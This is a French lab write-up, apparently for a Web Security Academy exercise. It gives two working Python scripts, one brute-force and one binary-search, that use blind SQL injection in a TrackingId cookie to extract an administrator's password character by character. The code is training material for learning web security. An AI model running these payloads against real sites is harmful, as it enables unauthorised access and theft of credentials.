On a un cookie de session `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`, et le serveur fait la requête SQL : `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`.
On peut alors faire un SQLi, mais on ne verra pas la réponse. Malgré tout, on peut identifier si la requête à fonctionner car la réponse du serveur inclut la chaîne de caractères "Welcome back!".

## Brute force
```python
import requests
import string

URL = 'https://0a70007e041c1db580b4a8d3005500a1.web-security-academy.net/'
success_string = 'Welcome back!'

def create_payload(position, caracter):
	return f"WAwPZU3PeK0d7itb' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1) = '{caracter}'--"	

def send(payload):
	cookies = {'session':'U1ubtxTtVKD5NSeGO2vwTK6XAIJMkFWh', 'TrackingId': payload}
	r = requests.get(URL, cookies=cookies)
	return r.text


caracters_range = string.ascii_lowercase + string.ascii_uppercase + string.digits # + string.punctuation + string.whitespace 

result = ''
position = 1
condition = True  # on s'arrete lorsqu'on a trouvé le dernier caractère (i.e. le suivant n'existe pas)

while condition :
	condition = False
	for c in caracters_range:
		payload = create_payload(position,c)
		response = send(payload)
		if success_string in response:
			result += c
			condition = True    # on passe à la lettre suivante 
			position += 1
			print("WOOOOOOOOOOOOh : ", c)
			break

print("Résultat : ", result)
```


## Dichotomie
```python
import requests
import string

URL = 'https://0a70007e041c1db580b4a8d3005500a1.web-security-academy.net/'
success_string = 'Welcome back!'

def create_payload_equals(position, caracter):
	return f"WAwPZU3PeK0d7itb' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1) = '{caracter}'--"	

def create_payload_sup(position, caracter):
	return f"WAwPZU3PeK0d7itb' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1) > '{caracter}'--"	

def send(payload):
	cookies = {'session':'U1ubtxTtVKD5NSeGO2vwTK6XAIJMkFWh', 'TrackingId': payload}
	r = requests.get(URL, cookies=cookies)
	return r.text


"""
string.punctuation = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'

Code ASCII :
33-47 : !"#$%&\'()*+,-./
48-57 : 0-9
58-64 : :;<=>?@
65-90 : A-Z
91-96 : [\\]^_`
97-122 : a-z
123-126 : {|}~
"""
# caracters_range doit être une chaine de caractères avec des codes ascii croissants
# caracters_range = ''.join([chr(i) for i in range(33, 127)])
caracters_range = string.digits + string.ascii_uppercase + string.ascii_lowercase


result = ''
position = 1

condition = True  # on s'arrete lorsqu'on a trouvé le dernier caractère (i.e. le suivant n'existe pas)

# La boucle extérieure fait avancer la variable 'position'
while condition :
	condition = False
	
	# Recherche par dichotomie
	inf = 0
	sup = len(caracters_range)
	while sup-inf > 2:
		middle = inf + (sup-inf)//2
		payload = create_payload_sup(position, caracters_range[middle])
		response = send(payload)
		if success_string in response :
			inf = middle
		else :
			sup = middle
	
	# Identification finale
	for i in range(inf, sup+1):
		c = caracters_range[i]
		payload = create_payload_equals(position,c)
		response = send(payload)
		if success_string in response:
			result += c
			condition = True    # on passe à la lettre suivante 
			position += 1
			print("WOOOOOOOOOOOOh : ", c)
			break

print("Résultat : ", result)
```
